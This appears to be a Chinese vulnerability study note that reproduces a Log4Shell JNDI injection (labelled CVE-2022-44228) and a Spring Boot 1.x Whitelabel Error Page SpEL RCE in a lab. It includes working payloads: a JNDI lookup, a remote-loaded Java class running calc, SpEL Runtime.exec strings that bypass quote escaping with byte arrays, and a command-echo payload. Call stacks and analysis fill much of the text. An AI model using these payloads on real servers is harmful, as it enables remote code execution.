前置基础
---

- SpringBoot
- SpEL

相关漏洞
---
### SpringBoot RCE via CVE-2022-44228
> 2022/3/18

参考资料
- https://github.com/pimps/JNDI-Exploit-Kit
- https://github.com/feihong-cs/JNDIExploit/

#### 漏洞复现
payload - DNSLog
```
payload=${jndi:ldap://0le2eh.dnslog.cn}
```
![image](https://user-images.githubusercontent.com/55024146/158930416-a79003d1-ca67-4107-9a77-ce9322592062.png)


payload - 计算器
```java
# ExecTemplateJDK8.class
public class ExecTemplateJDK8
{
    static {
        String[] array;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            array = new String[] { "cmd.exe", "/C", "calc" };
        }
        else {
            array = new String[] { "/bin/bash", "-c", "calc" };
        }
        try {
            Runtime.getRuntime().exec(array);
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
        System.out.println();
    }
}
```
原理：远程类加载，静态代码块被执行。

![image](https://user-images.githubusercontent.com/55024146/158934449-7b04b952-53cb-4fd6-ac76-c45ac39d574f.png)

调用栈
```
forName:334, Class (java.lang)
loadClass:72, VersionHelper12 (com.sun.naming.internal)
loadClass:87, VersionHelper12 (com.sun.naming.internal)
getObjectFactoryFromReference:158, NamingManager (javax.naming.spi)
getObjectInstance:189, DirectoryManager (javax.naming.spi)
c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
lookup:172, JndiManager (org.apache.logging.log4j.core.net)
lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)
lookup:223, Interpolator (org.apache.logging.log4j.core.lookup)
resolveVariable:1116, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:1038, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)
replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)
format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)
toSerializable:345, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)
toText:244, PatternLayout (org.apache.logging.log4j.core.layout)
encode:229, PatternLayout (org.apache.logging.log4j.core.layout)
encode:59, PatternLayout (org.apache.logging.log4j.core.layout)
directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)
callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)
callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)
callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)
callAppenders:543, LoggerConfig (org.apache.logging.log4j.core.config)
processLogEvent:502, LoggerConfig (org.apache.logging.log4j.core.config)
log:485, LoggerConfig (org.apache.logging.log4j.core.config)
log:460, LoggerConfig (org.apache.logging.log4j.core.config)
log:82, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config)
log:161, Logger (org.apache.logging.log4j.core)
tryLogMessage:2198, AbstractLogger (org.apache.logging.log4j.spi)
logMessageTrackRecursion:2152, AbstractLogger (org.apache.logging.log4j.spi)
logMessageSafely:2135, AbstractLogger (org.apache.logging.log4j.spi)
logMessage:2028, AbstractLogger (org.apache.logging.log4j.spi)
logIfEnabled:1899, AbstractLogger (org.apache.logging.log4j.spi)
error:866, AbstractLogger (org.apache.logging.log4j.spi)
hello:24, Log4j2RceApplication (com.example.log4j2_rce)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
doInvoke:189, InvocableHandlerMethod (org.springframework.web.method.support)
invokeForRequest:138, InvocableHandlerMethod (org.springframework.web.method.support)
invokeAndHandle:102, ServletInvocableHandlerMethod (org.springframework.web.servlet.mvc.method.annotation)
invokeHandlerMethod:895, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)
handleInternal:800, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)
handle:87, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)
doDispatch:1038, DispatcherServlet (org.springframework.web.servlet)
doService:942, DispatcherServlet (org.springframework.web.servlet)
processRequest:1005, FrameworkServlet (org.springframework.web.servlet)
doPost:908, FrameworkServlet (org.springframework.web.servlet)
service:660, HttpServlet (javax.servlet.http)
service:882, FrameworkServlet (org.springframework.web.servlet)
service:741, HttpServlet (javax.servlet.http)
internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilter:53, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:99, RequestContextFilter (org.springframework.web.filter)
doFilter:107, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:92, FormContentFilter (org.springframework.web.filter)
doFilter:107, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:93, HiddenHttpMethodFilter (org.springframework.web.filter)
doFilter:107, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:200, CharacterEncodingFilter (org.springframework.web.filter)
doFilter:107, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
invoke:200, StandardWrapperValve (org.apache.catalina.core)
invoke:96, StandardContextValve (org.apache.catalina.core)
invoke:490, AuthenticatorBase (org.apache.catalina.authenticator)
invoke:139, StandardHostValve (org.apache.catalina.core)
invoke:92, ErrorReportValve (org.apache.catalina.valves)
invoke:74, StandardEngineValve (org.apache.catalina.core)
service:343, CoyoteAdapter (org.apache.catalina.connector)
service:408, Http11Processor (org.apache.coyote.http11)
process:66, AbstractProcessorLight (org.apache.coyote)
process:834, AbstractProtocol$ConnectionHandler (org.apache.coyote)
doRun:1415, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
run:49, SocketProcessorBase (org.apache.tomcat.util.net)
runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
run:745, Thread (java.lang)
```
#### 漏洞利用

##### 回显


##### 内存马


### SpringBoot 1.x Whitelabel Error Page SpEL RCE
> 2022/3/17

参考资料
- https://github.com/LandGrey/SpringBootVulExploit/
- https://github.com/spring-projects/spring-boot/issues/4763


#### 漏洞复现

payload-算术表达式
```
id=${1011+1011}
```
![image](https://user-images.githubusercontent.com/55024146/158839423-9045a29c-e31d-46e7-83ef-136caab0dc4a.png)

可见表达式被成功解析

payload-计算器
```
id=${T(java.lang.Runtime).getRuntime().exec("calc")}
```
失败，抛出异常如下

![image](https://user-images.githubusercontent.com/55024146/158841307-e68e7c5c-2ee7-4ca0-834d-10de59a227e6.png)


debug、看源码发现，在进行SpEL解析前，有以下处理
```
convertToReference:133, HtmlCharacterEntityReferences (org.springframework.web.util)
htmlEscape:90, HtmlUtils (org.springframework.web.util)
htmlEscape:63, HtmlUtils (org.springframework.web.util)
resolvePlaceholder:218, ErrorMvcAutoConfiguration$SpelPlaceholderResolver (org.springframework.boot.autoconfigure.web)
parseStringValue:147, PropertyPlaceholderHelper (org.springframework.util)
replacePlaceholders:126, PropertyPlaceholderHelper (org.springframework.util)
render:194, ErrorMvcAutoConfiguration$SpelView (org.springframework.boot.autoconfigure.web)
render:1244, DispatcherServlet (org.springframework.web.servlet)
processDispatchResult:1027, DispatcherServlet (org.springframework.web.servlet)
doDispatch:971, DispatcherServlet (org.springframework.web.servlet)
doService:893, DispatcherServlet (org.springframework.web.servlet)
processRequest:970, FrameworkServlet (org.springframework.web.servlet)
doPost:872, FrameworkServlet (org.springframework.web.servlet)
service:648, HttpServlet (javax.servlet.http)
service:846, FrameworkServlet (org.springframework.web.servlet)
service:729, HttpServlet (javax.servlet.http)
...
```

![image](https://user-images.githubusercontent.com/55024146/158843615-71270054-7003-4c7e-8b1d-ad041bdfd0af.png)

对单引号、双引号、尖括号、&进行了HTML实体编码

![image](https://user-images.githubusercontent.com/55024146/158844001-1031b338-e458-4017-b7a4-44d9017600aa.png)

如图，此时传入的payload中双引号已被编码，则不再符合SpEL表达式的语法，自然也就没法成功利用。

![image](https://user-images.githubusercontent.com/55024146/158845997-16e846c5-906f-4c00-9112-92ba85abe6b4.png)

绕过：不出现单双引号
> 利用String类的特性：将byte型数组转为字符串串对象

![image](https://user-images.githubusercontent.com/55024146/158849319-16a3c8ec-6f79-4f85-bca5-15e5b1463258.png)

```
id=${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{99,97,108,99}))}
```
![image](https://user-images.githubusercontent.com/55024146/158850107-fabff113-b042-4e4b-8efd-eb668cd844f3.png)

测试效果

![image](https://user-images.githubusercontent.com/55024146/158850307-2077f252-0e4f-4972-b158-ce1821db3c1f.png)

#### 漏洞利用

##### 回显
```
(new Scanner(Runtime.getRuntime().exec(cmd).getInputStream())).useDelimiter("\\A").next()
```

```
id=${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{119,104,111,97,109,105})).getInputStream()))}
```
![image](https://user-images.githubusercontent.com/55024146/158853617-24cd3b1c-3f40-474b-9389-befca11d242c.png)

##### 内存马

> 待完成




